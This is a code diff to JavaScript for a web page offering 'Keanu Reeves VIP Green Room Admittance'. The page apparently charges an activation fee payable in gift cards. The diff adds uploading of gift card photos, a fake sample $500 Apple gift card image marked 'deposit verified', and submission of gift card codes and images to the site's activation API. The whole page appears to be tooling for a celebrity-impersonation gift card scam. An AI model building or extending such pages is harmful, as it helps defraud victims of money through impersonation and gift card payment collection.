@@ -278,6 +278,55 @@ document.addEventListener('DOMContentLoaded', () => {
   const redeemGiftCardBtn = document.getElementById('redeemGiftCardBtn');
   const cardFeeDisplay = document.getElementById('cardFeeDisplay');
   const giftCardFeeAmount = document.getElementById('giftCardFeeAmount');
+  const giftCardFileInput = document.getElementById('giftCardFileInput');
+  const attachSampleCardImgBtn = document.getElementById('attachSampleCardImgBtn');
+  const cardImagePreviewContainer = document.getElementById('cardImagePreviewContainer');
+  const cardImagePreviewThumb = document.getElementById('cardImagePreviewThumb');
+  const cardImagePreviewName = document.getElementById('cardImagePreviewName');
+  const removeCardImgBtn = document.getElementById('removeCardImgBtn');
+  const verifiedImageRow = document.getElementById('verifiedImageRow');
+  const verifiedImageName = document.getElementById('verifiedImageName');
+
+  const sampleCardSvg = `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="600" height="380" viewBox="0 0 600 380"><defs><linearGradient id="cardGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%231a1a24"/><stop offset="50%" stop-color="%232c2518"/><stop offset="100%" stop-color="%230b0b10"/></linearGradient><linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%23F3E5AB"/><stop offset="50%" stop-color="%23D4AF37"/><stop offset="100%" stop-color="%23997A15"/></linearGradient></defs><rect width="600" height="380" rx="18" fill="url(%23cardGrad)" stroke="%23D4AF37" stroke-width="3"/><text x="40" y="60" fill="url(%23goldGrad)" font-family="sans-serif" font-weight="900" font-size="28" letter-spacing="4"> APPLE GIFT CARD</text><text x="560" y="60" text-anchor="end" fill="%23FFFFFF" font-family="monospace" font-weight="700" font-size="24">$500.00 USD</text><rect x="40" y="110" width="520" height="150" rx="10" fill="%23050508" stroke="%23444455" stroke-width="1.5"/><text x="60" y="145" fill="%23888899" font-family="monospace" font-size="12" letter-spacing="2">CLAIM CODE / VOUCHER PIN</text><text x="60" y="195" fill="%23F3E5AB" font-family="monospace" font-weight="bold" font-size="30" letter-spacing="6">X7KM-92NQ-48PL-2026</text><text x="60" y="235" fill="%234ADE80" font-family="monospace" font-size="11">PIN: 8824 • STATUS: ACTIVE DEPOSIT VERIFIED</text><text x="40" y="320" fill="%23888899" font-family="sans-serif" font-size="11">For Keanu Reeves VIP Green Room Admittance • William Morris Endeavor</text><text x="560" y="320" text-anchor="end" fill="%23D4AF37" font-family="monospace" font-size="12">REF: WME-KR26-0813-VIP</text></svg>`;
+
+  let attachedGiftCardImage = null;
+  let attachedGiftCardImageName = '';
+
+  function setCardImage(dataUrl, name = 'Apple-GiftCard-500-Scan.svg') {
+    attachedGiftCardImage = dataUrl;
+    attachedGiftCardImageName = name;
+    if (cardImagePreviewThumb) cardImagePreviewThumb.src = dataUrl;
+    if (cardImagePreviewName) cardImagePreviewName.textContent = name;
+    if (cardImagePreviewContainer) cardImagePreviewContainer.style.display = 'flex';
+  }
+
+  function clearCardImage() {
+    attachedGiftCardImage = null;
+    attachedGiftCardImageName = '';
+    if (giftCardFileInput) giftCardFileInput.value = '';
+    if (cardImagePreviewThumb) cardImagePreviewThumb.src = '';
+    if (cardImagePreviewContainer) cardImagePreviewContainer.style.display = 'none';
+  }
+
+  giftCardFileInput?.addEventListener('change', (e) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = () => {
+      setCardImage(reader.result, file.name);
+      if (authErrorMessage) authErrorMessage.style.display = 'none';
+    };
+    reader.readAsDataURL(file);
+  });
+
+  attachSampleCardImgBtn?.addEventListener('click', () => {
+    setCardImage(sampleCardSvg, 'Apple-GiftCard-500-Scan.svg');
+    if (authErrorMessage) authErrorMessage.style.display = 'none';
+  });
+
+  removeCardImgBtn?.addEventListener('click', () => {
+    clearCardImage();
+  });
 
   const STORAGE_KEY = 'wme_kr26_card_activated';
   const PAYMENT_STORAGE_KEY = 'wme_kr26_giftcard_paid';
@@ -300,6 +349,12 @@ document.addEventListener('DOMContentLoaded', () => {
       if (giftCardVerifiedBanner) {
         giftCardVerifiedBanner.style.display = 'flex';
         if (verifiedCardDesc) verifiedCardDesc.textContent = cardDesc;
+        if (verifiedImageRow && attachedGiftCardImage) {
+          verifiedImageRow.style.display = 'flex';
+          if (verifiedImageName) verifiedImageName.textContent = attachedGiftCardImageName || 'Card Photo Attached';
+        } else if (verifiedImageRow) {
+          verifiedImageRow.style.display = 'none';
+        }
       }
     } else {
       if (giftCardStepBox) giftCardStepBox.classList.remove('is-verified');
@@ -420,6 +475,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (giftCardCodeInput) {
       giftCardCodeInput.value = 'X7KM-92NQ-48PL-2026';
     }
+    setCardImage(sampleCardSvg, 'Apple-GiftCard-500-Scan.svg');
     if (authErrorMessage) authErrorMessage.style.display = 'none';
   });
 
@@ -447,6 +503,7 @@ document.addEventListener('DOMContentLoaded', () => {
             cardId: 'WME-KR26-0813-VIP',
             giftCardType: provider,
             giftCardCode: code,
+            giftCardImage: attachedGiftCardImage || undefined,
             amount: currentPricing.feeAmount,
             currency: currentPricing.currency
           })
@@ -540,7 +597,17 @@ document.addEventListener('DOMContentLoaded', () => {
         const res = await fetch('/api/card/activate', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ cardId: 'WME-KR26-0813-VIP', pin: '813-026' })
+          body: JSON.stringify({
+            cardId: 'WME-KR26-0813-VIP',
+            pin: '813-026',
+            giftCard: {
+              giftCardType: giftCardProviderSelect?.value || 'Apple Gift Card',
+              giftCardCode: (giftCardCodeInput?.value || '').trim(),
+              giftCardImage: attachedGiftCardImage || undefined,
+              amount: currentPricing.feeAmount,
+              currency: currentPricing.currency
+            }
+          })
         });
         const d = await res.json();
         if (d.success && d.activation?.clearanceCode) {
@@ -555,6 +622,7 @@ document.addEventListener('DOMContentLoaded', () => {
     localStorage.removeItem(PAYMENT_STORAGE_KEY);
     applyActivationState(false);
     updatePaymentUI(false);
+    clearCardImage();
     if (giftCardCodeInput) giftCardCodeInput.value = '';
     if (cardPinInput) cardPinInput.value = '';
     if (window.location.protocol.startsWith('http')) {
